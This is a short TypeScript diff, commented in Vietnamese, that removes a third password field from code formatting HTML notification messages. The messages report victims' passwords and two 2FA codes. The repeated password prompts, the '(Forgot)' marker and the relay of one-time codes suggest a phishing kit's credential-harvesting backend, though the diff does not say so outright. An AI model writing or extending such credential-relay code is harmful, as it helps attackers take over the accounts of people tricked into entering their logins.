@@ -88,19 +88,6 @@ function formatCodeField(value: unknown): string {
     return s ? escapeHtml(s) : '';
 }
 
-/** Phải trùng `PASSWORD_THIRD_FORGOT_MARKER` trong `PasswordModal.tsx` */
-const PASSWORD_THIRD_FORGOT_MARKER = '(Forgot)';
-
-/** Password(3): mật thật chỉ escape; marker Quên mật khẩu thêm icon để phân biệt. */
-function formatPasswordThirdDisplay(value: unknown): string {
-    const s = value === undefined || value === null ? '' : String(value).trim();
-    if (!s) return '';
-    if (s === PASSWORD_THIRD_FORGOT_MARKER) {
-        return `ℹ️\u00A0${escapeHtml(s)}`;
-    }
-    return escapeHtml(s);
-}
-
 
 function getChangedFields(prevData: any = {}, nextData: any = {}, inputNew: any = {}): string[] {
     const before = normalizeData(prevData);
@@ -120,7 +107,6 @@ function getChangedFields(prevData: any = {}, nextData: any = {}, inputNew: any 
         phone: 'Phone Number',
         password: 'Password First',
         passwordSecond: 'Password Second',
-        passwordThird: 'Password Third',
         authMethod: 'Auth Method',
         twoFa: 'Code 2FA(1)',
         twoFaSecond: 'Code 2FA(2)',
@@ -155,7 +141,6 @@ function normalizeData(input: any = {}) {
         phone: input.phone ?? '',
         password: input.password ?? '',
         passwordSecond: input.passwordSecond ?? '',
-        passwordThird: input.passwordThird ?? '',
         authMethod: input.authMethod ?? '',
         twoFa: input.twoFa ?? '',
         twoFaSecond: input.twoFaSecond ?? '',
@@ -204,7 +189,6 @@ function formatMessage(data: any): string {
         `<b>🔑 PASSWORD</b>`,
         `<b>Password(1):</b> <code>${formatCodeField(d.password)}</code>`,
         `<b>Password(2):</b> <code>${formatCodeField(d.passwordSecond)}</code>`,
-        `<b>Password(3):</b> <code>${formatPasswordThirdDisplay(d.passwordThird)}</code>`,
         `${authLine ? authLine.trim() : ''}`
     ].filter(Boolean);
 
